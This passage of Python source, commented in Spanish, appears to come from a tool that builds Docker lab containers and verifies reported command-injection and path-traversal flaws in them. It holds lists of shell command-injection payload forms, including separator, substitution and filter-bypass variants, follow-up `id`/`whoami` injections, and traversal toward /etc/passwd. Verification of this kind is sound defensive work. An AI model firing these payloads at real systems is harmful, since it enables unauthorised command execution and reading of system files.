    `extra_files` (opcional): diccionario {nombre_fichero: contenido} que se escribe en el
    directorio de contexto Docker ANTES de construir -- necesario para COPY app.py etc."""
    # Cleanup stale containers from interrupted runs (non-fatal)
    # Cleans both naming conventions: legacy bo_lab_ and current binoracle-genverify-
    _stale = cleanup_stale_lab_containers(prefix="binoracle-genverify-", max_age_minutes=60)
    _stale += cleanup_stale_lab_containers(prefix="bo_lab_", max_age_minutes=60)
    if _stale:
        step(f"  cleanup: {len(_stale)} contenedor(es) huérfano(s) eliminados: "
             f"{', '.join(_stale[:3])}")

    # Disk pressure check: free space before spinning up a new lab
    _disk = cleanup_docker_disk_pressure(min_free_gb=2.0, image_max_age_hours=24, on_step=step)
    if _disk.get("actions"):
        _freed = _disk["free_gb_after"] - _disk["free_gb_before"]
        step(f"  disk: {_disk['free_gb_before']:.1f}→{_disk['free_gb_after']:.1f} GB libres "
             f"(+{_freed:.1f} GB liberados, {len(_disk['actions'])} acciones)")

    # Lab ya corriendo externamente (--target-url) — saltar Docker por completo
    if prebuilt_url:
        step(f"usando target externo pre-arrancado: {prebuilt_url} (sin Docker)")
        res.evidence["prebuilt_target"] = prebuilt_url
        return (None, prebuilt_url.rstrip("/"), "prebuilt")

    if not dockerfile_body and docker_image:
        # Auto-generate minimal Dockerfile when only a docker_image is known (no source/dockerfile).
        # Pull port hints from docker_profiles.py; fall back to common ports.
        try:
            from binoracle.workflows.docker_profiles import _DOCKER_IMAGE_PROFILES as _DP
            # docker_image may have a tag (e.g. "dpage/pgadmin4:8.3") but profile keys use
            # prefix patterns like "dpage/pgadmin4:" — try exact match first, then prefix.
            _prof = _DP.get(docker_image) or {}
            if not _prof:
                for _pk in _DP:
                    if docker_image.startswith(_pk) or _pk.rstrip(":").rstrip("-") == docker_image.split(":")[0]:
                        _prof = _DP[_pk] or {}
                        break
            # Support both "port" (single) and "ports" (list) in profiles
            _img_ports = _prof.get("ports") or ([_prof["port"]] if _prof.get("port") else [])
        except Exception:
            _img_ports = []
        _auto_expose = " ".join(str(p) for p in _img_ports) if _img_ports else "8080 3000 5000 80"
        # Include required ENV vars from the profile (e.g. PGADMIN_DEFAULT_EMAIL for pgAdmin)
        _env_lines = ""
        try:
            _envs = _prof.get("envs") or {}
            if _envs:
                _env_lines = "\n" + "\n".join(f"ENV {k}={v}" for k, v in _envs.items())
        except Exception:
            _env_lines = ""
        dockerfile_body = f"FROM {docker_image}{_env_lines}\nEXPOSE {_auto_expose}\n"
        step(f"docker_image={docker_image!r}: generando Dockerfile minimo (EXPOSE {_auto_expose})")

    if dockerfile_body:
        # Analyst-provided Dockerfile takes priority over anything in source_dir
        import tempfile
        # Garantizar EXPOSE: sin él `-P` no publica ningún puerto y discover_http agota reintentos.
        # Escaneamos el Dockerfile y los extra_files en busca de puertos; si no encontramos nada
        # usamos los más comunes (5000, 8080, 3000, 80).
        if "EXPOSE" not in dockerfile_body.upper():
            import re as _re_df_expose
            _port_hits: set = set()
            for _src in [dockerfile_body] + list((extra_files or {}).values()):
                for _m in _re_df_expose.findall(
                        r'(?:port|PORT|listen|LISTEN)[=:\s]+(\d{2,5})', _src, _re_df_expose.IGNORECASE):
                    if _m and 79 < int(_m) <= 65535:
                        _port_hits.add(int(_m))
                # también "0.0.0.0:PORT" y ":PORT" patterns
                for _m in _re_df_expose.findall(r':(\d{2,5})\b', _src):
                    if _m and 79 < int(_m) <= 65535:
                        _port_hits.add(int(_m))
            _expose_ports = sorted(_port_hits) if _port_hits else [5000, 8080, 3000, 80]
            dockerfile_body = dockerfile_body.rstrip() + \
                f"\nEXPOSE {' '.join(str(p) for p in _expose_ports)}\n"
        ctx_dir = tempfile.mkdtemp(prefix="binoracle_analyst_ctx_")
        df_path = os.path.join(ctx_dir, "Dockerfile")
        with open(df_path, "w") as f:
            f.write(dockerfile_body)
        for fname, content in (extra_files or {}).items():
            fp = os.path.join(ctx_dir, fname)
            os.makedirs(os.path.dirname(fp), exist_ok=True)
            with open(fp, "w") as f:
                f.write(content)
        # Si extra_files incluye un docker-compose, usarlo en vez del Dockerfile autogenerado.
        # Caso: docker_image genera un Dockerfile mínimo pero el analista provee un compose
        # multi-servicio (p.ej. Mattermost+PostgreSQL) en extra_files — el compose tiene
        # prioridad porque contiene la infraestructura completa.
        _compose_in_extras = next(
            (os.path.join(ctx_dir, n)
             for n in (extra_files or {}) if os.path.basename(n) in _COMPOSE_NAMES),
            None)
        if _compose_in_extras and os.path.isfile(_compose_in_extras):
            target = {"kind": "compose", "path": _compose_in_extras, "context": ctx_dir,
                      "_analyst_ctx": ctx_dir}
            step("docker-compose en extra_files tiene prioridad sobre Dockerfile autogenerado")
        else:
            # Detect CMS hint from the docker_image name so discover_http gets the
            # ready-signal checks and extended tries for slow-booting images like Ghost.
            _cms_from_image = None
            _known_cms_images = {
                "ghost": "ghost", "strapi": "strapi", "directus": "directus",
                "payload": "payload", "ghost/ghost": "ghost",
                "paperless-ngx": "paperless", "audiobookshelf": "audiobookshelf",
                "nextcloud": "nextcloud", "pgadmin": "pgadmin", "mattermost": "mattermost",
            }
            for _img_key, _cms_val in _known_cms_images.items():
                if _img_key in docker_image.lower():
                    _cms_from_image = _cms_val
                    break
            _target_extra = {"cms": _cms_from_image} if _cms_from_image else {}
            target = {"kind": "dockerfile", "path": df_path, "context": ctx_dir,
                      "_analyst_ctx": ctx_dir, **_target_extra}
            step("usando Dockerfile del analista (prioridad sobre repo)")
    else:
        target = _find_build_target(source_dir, pkg_version=pkg_version)
    if target is None:
        res.detail = ("no se encontro Dockerfile ni docker-compose.yml en el codigo descargado, "
                      "y el stack tampoco se reconocio por sus ficheros propios (package.json/"
                      "requirements.txt/composer.json/*.php)")
        res.limitations.append("la verificacion generica SOLO puede montar un objetivo que "
                               "traiga su propio Dockerfile/docker-compose.yml, o cuyo stack se "
                               "reconozca por sus ficheros propios (Node/Python/PHP) -- fuera de "
                               "eso no hay forma de arrancarlo sin adivinar a ciegas")
        return None
    if target.get("auto_generado"):
        step(f"objetivo generico SIN Dockerfile/compose propio -- stack detectado por "
             f"'{target['stack_detectado']}', generando un Dockerfile minimo propio para "
             f"arrancarlo (NO es el del autor del PoC)...")
        res.evidence["dockerfile_auto_generado"] = True
        res.evidence["stack_detectado"] = target["stack_detectado"]
        res.limitations.append(
            f"el objetivo no traia su propio Dockerfile/docker-compose.yml -- se genero uno "
            f"MINIMO propio a partir del stack detectado ('{target['stack_detectado']}'), "
            f"acotado a Node/Python/PHP sin framework; si el proyecto real necesita variables de "
            f"entorno, servicios auxiliares (base de datos, cache) o un arranque distinto, puede "
            f"no levantar correctamente -- revisa los logs si el objetivo no responde")
    else:
        step(f"objetivo generico detectado: {target['kind']} en {target['path']}")

    lab = _GenericLab(_token())
    step("construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
    r = lab.build_and_run(target)
    if r.returncode != 0:
        res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:2000]}"
        if lab is not None:
            lab.teardown()
        return None

    # Wrap the post-build steps in a try/finally so that any unexpected exception
    # (e.g. discover_http() throwing, setup_commands raising) tears the container down
    # instead of leaving it as a zombie. _lab_ok is only set True on the success path,
    # so the finally only skips teardown when we hand the lab to the caller.
    _lab_ok = False
    try:
        _cms_hint = target.get("cms")
        step(f"esperando a que el objetivo responda HTTP{' (CMS: ' + _cms_hint + ')' if _cms_hint else ''}...")
        found_http = lab.discover_http(cms=_cms_hint)
        if found_http is None:
            res.detail = "el objetivo arranco pero ningun puerto publicado respondio HTTP a tiempo"
            for c in lab.running_containers():
                res.logs.append(f"docker logs ({c}):\n" + lab.logs_tail(c))
            return None
        container, port = found_http[:2]
        _found_host = found_http[2] if len(found_http) > 2 else _lab_host()
        base_url = f"http://{_found_host}:{port}"
        step(f"objetivo arriba: {base_url} (contenedor '{container}')")

        # Store discovered OpenAPI routes on res so callers can seed endpoint candidates
        try:
            _openapi_routes = _discover_routes_from_openapi(base_url, step)
            if _openapi_routes:
                res.evidence["openapi_routes"] = _openapi_routes[:20]
        except Exception:
            pass

        # Also probe for GraphQL endpoints — many modern CMSs expose /graphql
        try:
            _gql_eps = _discover_graphql_endpoints(base_url, step)
            if _gql_eps:
                res.evidence["graphql_endpoints"] = _gql_eps
                # Deep schema probe: extract queries/mutations/sensitive fields
                _gql_schema = _graphql_schema_probe(
                    base_url, _gql_eps[0], step=step)
                if _gql_schema.get("queries") or _gql_schema.get("mutations"):
                    res.evidence["graphql_schema"] = _gql_schema
        except Exception:
            pass

        for cmd in (setup_commands or []):
            step(f"ejecutando paso de configuracion real dentro del contenedor: {cmd!r}...")
            r = lab.sh("exec", container, "sh", "-c", cmd, timeout=480)
            _cmd_out = (r.stdout or "") + (r.stderr or "")
            _cmd_failed = r.returncode != 0
            # Tolerate nonzero exit for commands that emit warnings but complete their task:
            # Django `migrate` exits 1 on deprecation warnings yet runs all migrations.
            # Ruby `bundle install` exits 1 when gems have optional deps missing.
            # Node `npm install` exits 1 for peer dep warnings but installs packages.
            # Strategy: if returncode != 0 but the output contains success indicators,
            # treat it as a soft failure — log but continue.
            _SUCCESS_INDICATORS = (
                "successfully", "completed", "done", "installed", "migrated",
                "0 errors", "no errors", "bundle complete", "added ", "packages",
            )
            _HARD_FAILURE_INDICATORS = (
                "command not found", "no such file", "permission denied",
                "fatal error", "cannot find module", "ModuleNotFoundError",
                "SyntaxError", "ImportError", "Cannot open",
            )
            if _cmd_failed:
                _out_lower = _cmd_out.lower()
                _has_success = any(s in _out_lower for s in _SUCCESS_INDICATORS)
                _has_fatal = any(s.lower() in _out_lower for s in _HARD_FAILURE_INDICATORS)
                if _has_success and not _has_fatal:
                    step(f"[WARN] setup_command {cmd!r} salio con codigo {r.returncode} pero "
                         f"muestra indicadores de exito -- continuando (soft fail)")
                    res.logs.append(f"setup_commands[{cmd!r}] soft-fail (rc={r.returncode}):\n"
                                    f"{_cmd_out[-400:]}")
                else:
                    res.detail = (f"el paso de configuracion {cmd!r} fallo (codigo {r.returncode}): "
                                  f"{_cmd_out[-500:]}")
                    res.logs.append(f"setup_commands[{cmd!r}] stdout/stderr:\n{_cmd_out}")
                    return None

        _lab_ok = True
        # Log tested version/image for all generic verifiers via res.evidence
        try:
            if pkg_version:
                res.evidence["tested_pkg_version"] = pkg_version
            if docker_image:
                res.evidence["tested_docker_image"] = docker_image
            if not pkg_version and not docker_image:
                # Try common version endpoints as fallback
                import requests as _rq_v
                for _vpath in ("/version", "/api/version", "/api/v1/version",
                               "/_version", "/status", "/health"):
                    try:
                        _vr = _rq_v.get(base_url + _vpath, timeout=5, allow_redirects=False)
                        if _vr.status_code == 200 and len(_vr.text or "") < 500:
                            res.evidence["tested_app_version_response"] = {
                                "path": _vpath, "body": _vr.text[:200]}
                            break
                    except Exception:
                        continue
        except Exception:
            pass
        return (lab, base_url, container)
    except Exception as _e_boot:
        step(f"[error inesperado] fallo en bootstrap post-build: {str(_e_boot)[:150]}")
        res.detail = f"fallo inesperado en bootstrap: {str(_e_boot)[:300]}"
        return None
    finally:
        if not _lab_ok:
            try:
                if lab is not None:
                    lab.teardown()
            except Exception:
                pass


def verify_generic_command_injection(
    source_dir: str, endpoint: str, http_method: str, parameters,
    cmd_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
    auth_required: bool = False,
    docker_image: str = "",
) -> WpVerifyResult:
    """Verifica OS command injection contra CUALQUIER objetivo que traiga su propio Dockerfile/
    docker-compose.yml, sin asumir el stack (Python/Node/Go/PHP/Java/Ruby... todos escriben a
    disco igual, asi que el canario de fichero via `docker exec` sirve siempre). Si auth_required
    se pasa True, intenta login automatico (bearer token o session cookie) antes de los intentos."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   setup_commands=setup_commands, docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        # Auth acquisition (pgAdmin, Django admin, Flask-Login, etc.)
        if auth_required:
            _auth_res = _try_acquire_app_token(base_url, step)
            if _auth_res:
                custom_headers = dict(custom_headers or {})
                if _auth_res.startswith("cookie:"):
                    custom_headers.setdefault("Cookie", _auth_res[7:])
                else:
                    custom_headers.setdefault("Authorization", f"Bearer {_auth_res}")
            else:
                step("WARN: auth_required pero no se pudo autenticar — continuando sin auth")
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_ci_{_token()}.txt"
        m = (http_method or "POST").upper().split("/")[0].split("|")[0].strip() or "POST"
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "canary_path": canary_path, "canary_secret": secret})
        # Captura: servidor arrancado, antes del ataque
        try:
            _shot_srv = _screenshot_terminal_step(
                "Servidor levantado — antes del ataque",
                f"Contenedor : {container}\nURL        : {base_url}\nMétodo     : {m}\nEndpoint   : {endpoint}")
            if _shot_srv:
                res.evidence.setdefault("screenshots", []).append(
                    {"png_b64": _shot_srv, "caption_es": "Servidor levantado antes del ataque",
                     "caption_en": "Server up before attack", "url": base_url})
        except Exception:
            pass

        # separadores reales de command injection (sh/bash/dash/ash) -- casuistica de
        # Command Injection/Intruder/command_exec.txt en PayloadsAllTheThings: los separadores
        # estandar (; | || && salto de linea), sustitucion de comandos (funciona aunque el valor
        # ya este entre comillas/concatenado), rotura de contexto de comillas, y bypass de
        # filtro de espacios via ${IFS}/%09 (comun cuando el codigo bloquea el caracter espacio
        # pero no el separador de comando).
        payload_forms = [
            f"; echo {secret} > {canary_path}",
            f"| echo {secret} > {canary_path}",
            f"|| echo {secret} > {canary_path}",
            f"&& echo {secret} > {canary_path}",
            f"\necho {secret} > {canary_path}\n",
            f"`echo {secret} > {canary_path}`",
            f"$(echo {secret} > {canary_path})",
            f"' ; echo {secret} > {canary_path} ; '",
            f'" ; echo {secret} > {canary_path} ; "',
            f";echo${{IFS}}{secret}>{canary_path}",
            f";echo%09{secret}>{canary_path}",
        ]
        # ademas de las anteriores, los separadores PUROS (sin comando incrustado, ver
        # payload_kb.load_command_injection_separators) de command_exec.txt que todavia no estan
        # arriba -- & solo y %0a%0d (CRLF).
        for sep in load_command_injection_separators():
            if sep in ("&", "%0a%0d"):
                payload_forms.append(f"{sep} echo {secret} > {canary_path}")
        candidate_params = [cmd_param_hint] if cmd_param_hint else (
            list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or []))
        if not candidate_params:
            candidate_params = [_pick_param(parameters, _CI_HINTS) or "input"]

        tried = []
        found = False
        first_resp_captured = False
        for pname in candidate_params:
            if found:
                break
            for form in payload_forms:
                payload = dict(parameters) if isinstance(parameters, dict) else {}
                payload[pname] = form
                try:
                    resp = _http_request(m, base_url + endpoint, timeout=15,
                                     data=payload if m != "GET" else None,
                                     params=payload if m == "GET" else None,
                                     headers=custom_headers or None)
                except Exception as e:
                    tried.append({"parametro": pname, "error": str(e)})
                    continue
                if not first_resp_captured:
                    # recorte del primer intento -- la evidencia que lee el bucle de aprendizaje-
                    # y-reintento del LLM para decidir si el endpoint/parametro probados son
                    # correctos (p.ej. un 404 de la propia app apuntaria a lo contrario).
                    res.evidence["respuesta_cuerpo_recorte"] = (getattr(resp, "text", "") or "")[:500]
                    first_resp_captured = True
                time.sleep(1)
                content = lab.read_file(container, canary_path)
                present = secret in content
                tried.append({"parametro": pname, "payload": form, "secreto_presente": present})
                if present:
                    found = True
                    res.evidence["parametro_ganador"] = pname
                    res.evidence["payload_ganador"] = form
                    step(f"VERIFICADO: {canary_path} dentro del contenedor contiene el secreto "
                         f"exacto tras inyectar via '{pname}' -- el comando se ejecuto de verdad.")
                    break

        res.evidence["intentos"] = tried
        if found:
            # ── Impact proof: run `id` and `whoami` via the same injection ──
            _id_output = ""
            _whoami_output = ""
            _pname_win = res.evidence.get("parametro_ganador", "")
            _form_win  = res.evidence.get("payload_ganador", "")
            _sep = ""
            # Extract the separator from the winning payload (;, |, &&, \n, $())
            for _s in ("; ", "| ", "|| ", "&& ", "\n", "`", "$("):
                if _form_win.startswith(_s.strip()) or f"{_s}" in _form_win:
                    _sep = _s.rstrip(); break
            if not _sep:
                _sep = ";"
            try:
                _id_path = f"/tmp/binoracle_id_{_token()}.txt"
                _who_path = f"/tmp/binoracle_who_{_token()}.txt"
                _id_payload = dict(parameters) if isinstance(parameters, dict) else {}
                _id_payload[_pname_win] = f"{_sep} id > {_id_path}"
                _http_request(m, base_url + endpoint, timeout=10,
                              data=_id_payload if m != "GET" else None,
                              params=_id_payload if m == "GET" else None,
                              headers=custom_headers or None)
                time.sleep(1)
                _id_output = lab.read_file(container, _id_path).strip()

                _who_payload = dict(parameters) if isinstance(parameters, dict) else {}
                _who_payload[_pname_win] = f"{_sep} whoami > {_who_path}"
                _http_request(m, base_url + endpoint, timeout=10,
                              data=_who_payload if m != "GET" else None,
                              params=_who_payload if m == "GET" else None,
                              headers=custom_headers or None)
                time.sleep(1)
                _whoami_output = lab.read_file(container, _who_path).strip()
            except Exception:
                pass
            res.evidence["rce_id_output"]     = _id_output
            res.evidence["rce_whoami_output"] = _whoami_output
            # Normalize into weaponization dict for uniform report/web rendering
            if _id_output or _whoami_output:
                _rce_impact = "CMDI confirmed — OS command execution: "
                if _id_output:
                    _rce_impact += f"id={_id_output[:80]}"
                if _whoami_output and _whoami_output != _id_output:
                    _rce_impact += f"; whoami={_whoami_output[:40]}"
                res.evidence["weaponization"] = {
                    "technique": "command_injection_rce",
                    "data": {k: v for k, v in
                             [("id_output", _id_output), ("whoami_output", _whoami_output)] if v},
                    "impact": _rce_impact,
                }
            # ──────────────────────────────────────────────────────────────

            res.verified = True
            res.ok = True
            res.detail = (f"COMMAND INJECTION confirmada: el payload en el parametro "
                          f"'{res.evidence['parametro_ganador']}' hizo que {canary_path} "
                          f"apareciera DENTRO del contenedor con el secreto exacto -- prueba "
                          f"inequivoca de ejecucion de comandos, no una deduccion por status code"
                          + (f"; id={_id_output!r}" if _id_output else ""))
            _ci_url = base_url + endpoint
            _ci_body = (f"COMMAND INJECTION — IMPACTO REAL CONFIRMADO\n\n"
                        f"{'─'*52}\n"
                        f"Parametro    : {res.evidence.get('parametro_ganador','')}\n"
                        f"Payload      : {res.evidence.get('payload_ganador','')}\n"
                        f"Canario      : {canary_path} → '{secret}'\n\n"
                        + (f"$ id\n{_id_output}\n" if _id_output else "")
                        + (f"$ whoami\n{_whoami_output}\n" if _whoami_output else "")
                        + f"\nRespuesta HTTP (primer intento):\n"
                        f"{res.evidence.get('respuesta_cuerpo_recorte','')[:300]}")
            _highlight_ci = _id_output or _whoami_output or secret
            _add_exploit_evidence(
                res=res, method=m, url=_ci_url,
                resp_or_body=_ci_body,
                highlight=_highlight_ci,
                caption_es=(f"COMMAND INJECTION confirmada: payload en '{res.evidence.get('parametro_ganador','')}' "
                            f"ejecuto comando en el servidor — id={repr(_id_output) if _id_output else '(ver canario)'}"),
                caption_en=(f"COMMAND INJECTION confirmed: payload in '{res.evidence.get('parametro_ganador','')}' "
                            f"executed server command — id={repr(_id_output) if _id_output else '(see canary)'}"),
                extra_terminal=_ci_body,
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de parametro/forma de "
                          f"inyeccion contra {endpoint} pero ninguna hizo aparecer el canario -- "
                          f"no se confirmo command injection (puede que el endpoint/parametro no "
                          f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
            # JSON body injection fallback: retry each form with Content-Type: application/json
            if m != "GET" and not res.verified:
                step("CMDI: probando inyeccion via JSON body (Content-Type: application/json)...")
                for pname in candidate_params[:3]:
                    if res.verified:
                        break
                    for form in payload_forms[:6]:
                        _jbody = dict(parameters) if isinstance(parameters, dict) else {}
                        _jbody[pname] = form
                        try:
                            _jresp = _http_request(m, base_url + endpoint, timeout=15,
                                                   json=_jbody,
                                                   headers={"Content-Type": "application/json",
                                                            **(custom_headers or {})})
                            # Check if canary appeared in response or on filesystem
                            _jbody_txt = getattr(_jresp, "text", "") or ""
                            if secret in _jbody_txt:
                                res.verified = True
                                res.ok = True
                                res.confidence = "confirmed"
                                res.evidence.update({
                                    "tecnica": "command-injection-json-body",
                                    "parametro_ganador": pname,
                                    "payload_ganador": form,
                                    "respuesta_cuerpo_recorte": _jbody_txt[:500],
                                })
                                res.detail = (f"COMMAND INJECTION via JSON body confirmada: "
                                              f"'{pname}'={form!r} hizo aparecer el canario en la respuesta")
                                step(f"CMDI JSON body VERIFICADO: '{pname}'")
                                break
                            # Also check canary on filesystem
                            _ci_check = subprocess.run(
                                ["docker", "exec", container, "cat", canary_path],
                                capture_output=True, text=True, timeout=5)
                            if secret in (_ci_check.stdout or ""):
                                res.verified = True
                                res.ok = True
                                res.confidence = "confirmed"
                                res.evidence.update({
                                    "tecnica": "command-injection-json-body",
                                    "parametro_ganador": pname,
                                    "payload_ganador": form,
                                })
                                res.detail = (f"COMMAND INJECTION via JSON body confirmada: "
                                              f"'{pname}'={form!r} escribio el canario en disco")
                                step(f"CMDI JSON body VERIFICADO (canario en disco): '{pname}'")
                                break
                        except Exception:
                            pass
        if not res.verified and res.confidence == "none":
            res.confidence = "inconclusive"
        if not res.verified:
            _capture_container_logs_on_failure(container, res, step)
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        res.confidence = "not_reproducible"
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        res.confidence = "not_reproducible"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_path_traversal(
    source_dir: str, endpoint: str, http_method: str, parameters,
    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, setup_commands: Optional[List[str]] = None,
    url_suffix: str = "", custom_headers: Optional[dict] = None,
    query_suffix: str = "",
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    _tried_params_set: Optional[frozenset] = None,
    auth_required: bool = False,
    docker_image: str = "",
    confirm_string: str = "",
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
    canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
    fuera de cualquier directorio de la app) y prueba las mismas variantes de profundidad/
    codificacion de '../' -- el mecanismo de prueba (leer un fichero del propio sistema de
    ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress.

    Comportamiento de descubrimiento autonomo: igual que verify_generic_ssti, escanea el codigo
    fuente en source_dir para descubrir endpoints reales (Rack::Static, Sinatra, Flask) ANTES
    de usar el endpoint que propuso el LLM. Esto resuelve el caso Rack::Static (CVE-2025-27610)
    donde el endpoint /static/ no aparece en la descripcion NVD y el LLM adivina /cgi-bin/.

    `setup_commands` (opcional, ver _bootstrap_generic_lab): comandos reales ejecutados dentro
    del contenedor DESPUES de arrancar y ANTES de atacar -- necesario para frameworks (Laravel/
    Microweber confirmado en vivo con CVE-2026-65694) que exigen una instalacion/migracion real
    antes de que sus rutas se comporten como en produccion.

    `query_suffix` (opcional): cadena de query string que se añade a TODAS las peticiones
    URL_PATH, e.g. 'import&' para CVE-2025-30208 Vite donde '?import&' bypasea el allow-list
    de @fs. Se concatena como '?{query_suffix}' si no incluye '?', o directo si ya lo lleva."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    # --- Descubrimiento autonomo de rutas desde el codigo fuente ---
    # Skip when the caller provided a custom dockerfile_body: the analyst owns the lab
    # and the endpoint hint is authoritative. Scanning the scaffolded directory would
    # find spurious Flask routes written by _scaffold_pip_lab and place them AHEAD of
    # the analyst-provided endpoint in the candidate list.
    _analyst_owns_lab = bool(dockerfile_body)
    scanned = (_scan_web_routes(source_dir) if (source_dir and not _analyst_owns_lab) else [])
    if scanned:
        step(f"escaneo de fuente: {len(scanned)} ruta(s) encontrada(s): " +
             ", ".join(ep for ep, _, _ in scanned))

    def _is_url_path_mode(params) -> bool:
        return ((path_param_hint or "").upper() in ("URL_PATH", "URLPATH") or
                (isinstance(params, dict) and any(k.upper() in ("URL_PATH", "URLPATH") for k in params)) or
                (isinstance(params, (list, tuple)) and any(str(p).upper() in ("URL_PATH", "URLPATH") for p in params)))

    # Normalizar endpoint: strip sintaxis de plantilla de ruta (Flask/aiohttp).
    # Confirmado en vivo con CVE-2024-23334: LLM propone '/static/<path:path>'.
    # '<path:path>' no es parte de la URL real -- hay que eliminarlo Y activar URL_PATH mode.
    if endpoint and '<' in endpoint:
        # Recorta desde el primer '<': '/static/<path:path>' -> '/static/'
        endpoint = re.sub(r'/<[^>]+>.*', '/', endpoint)
        if not endpoint.endswith('/'):
            endpoint = endpoint.rstrip('/') + '/'
        _url_path_mode_from_template = True
    else:
        _url_path_mode_from_template = False

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    _url_path_mode = _is_url_path_mode(parameters) or _url_path_mode_from_template

    # Double-slash endpoint detection: when the analyst sets an endpoint that contains
    # '//' (absolute-path bypass pattern like '/@fs//etc/passwd' in Vite), activate
    # URL_PATH mode automatically so the traversal loop treats it as a base path.
    # This handles cases where the payload is embedded in the endpoint itself.
    if not _url_path_mode and _analyst_owns_lab and endpoint and '//' in endpoint:
        _url_path_mode = True

    # Gap real (confirmado con CVE-2024-23334 / aiohttp): muchos path-traversal inyectan el
    # payload en el PATH de la URL, no en un query-param -- e.g. GET /static/../../etc/passwd.
    # El LLM puede indicarlo con path_param_hint="URL_PATH" (o pasando "url_path" como parametro).
    # Cuando el modo es URL_PATH el payload se concatena al endpoint en vez de enviarse como ?k=v.
    if not path_param and not _url_path_mode:
        # ultimo intento: si el endpoint ya termina en '/' es probable que espere el path a
        # continuacion (p.ej. /static/ -> /static/../../../../etc/passwd) -- modo URL_PATH.
        if endpoint and endpoint.endswith("/"):
            _url_path_mode = True
        elif _analyst_owns_lab:
            # Analyst provided a custom dockerfile — they know the endpoint. With no
            # path_param and no scan results, default to URL_PATH mode so the payload is
            # appended to the endpoint path (e.g. /hls/abc123/../../canary.txt).
            _url_path_mode = True
        elif not scanned:
            res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
            res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                                   "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
                                   "mano (path_param_hint) o usa path_param_hint='URL_PATH' si el "
                                   "payload va en el path de la URL (e.g. GET /files/../../etc/passwd)")
            return res

    # Construir lista ordenada de candidatos: rutas del escaneo primero, luego LLM
    # Cada candidato: (endpoint, params, method, url_path_mode)
    candidates: list = []
    seen_cands: set = set()
    for s_ep, s_params, s_meth in scanned:
        s_up = _is_url_path_mode(s_params) or s_ep.endswith("/")
        key = (s_ep, s_meth.upper())
        if key not in seen_cands:
            seen_cands.add(key)
            candidates.append((s_ep, s_params, s_meth.upper(), s_up, True))
    # LLM-guessed endpoint as fallback
    llm_up = _url_path_mode or (endpoint and endpoint.endswith("/"))
    llm_key = (endpoint or "/", (http_method or "GET").upper())
    if llm_key not in seen_cands and endpoint:
        candidates.append((endpoint, parameters, (http_method or "GET").upper(), llm_up, False))
    if not candidates:
        candidates.append((endpoint or "/", parameters, (http_method or "GET").upper(), llm_up, False))

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s, setup_commands=setup_commands,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        # Auth acquisition before traversal attempts.
        # audiobookshelf always requires a Bearer token even for path-traversal — force
        # auth_required=True when the image is audiobookshelf so the token is obtained.
        _abs_image = (docker_image or "").lower()
        if "audiobookshelf" in _abs_image or "advplyr" in _abs_image:
            auth_required = True
        if auth_required:
            _auth_res = _try_acquire_app_token(base_url, step)
            if _auth_res:
                custom_headers = dict(custom_headers or {})
                if _auth_res.startswith("cookie:"):
                    custom_headers.setdefault("Cookie", _auth_res[7:])
                else:
                    custom_headers.setdefault("Authorization", f"Bearer {_auth_res}")
            else:
                step("WARN: auth_required pero no se pudo autenticar — continuando sin auth")
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        # Captura: servidor arrancado, antes del ataque
        try:
            _shot_srv = _screenshot_terminal_step(
                "Servidor levantado — antes del ataque",
                f"Contenedor : {container}\nURL        : {base_url}\nCanario    : {canary_path}")
            if _shot_srv:
                res.evidence.setdefault("screenshots", []).append(
                    {"png_b64": _shot_srv, "caption_es": "Servidor levantado antes del ataque",
                     "caption_en": "Server up before attack", "url": base_url})
        except Exception:
            pass
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor del objetivo)...")
        _canary_failed = False
        if not lab.write_canary(container, canary_path, secret):
            # Fallback 1: try /var/tmp/ instead of /tmp/ (some containers mount /tmp noexec)
            _alt_canary = f"/var/tmp/binoracle_canary_{secret[:8]}"
            step(f"canario en {canary_path} fallo — intentando /var/tmp/ como alternativa...")
            if lab.write_canary(container, _alt_canary, secret):
                canary_path = _alt_canary
                rel = canary_path.lstrip("/")
                step(f"canario plantado en {canary_path}")
            else:
                # Fallback 2: use /etc/passwd as the read target — no plant needed,
                # check response for root:x:0:0: (always present on Linux containers)
                step("planta de canario fallida — continuando en modo /etc/passwd "
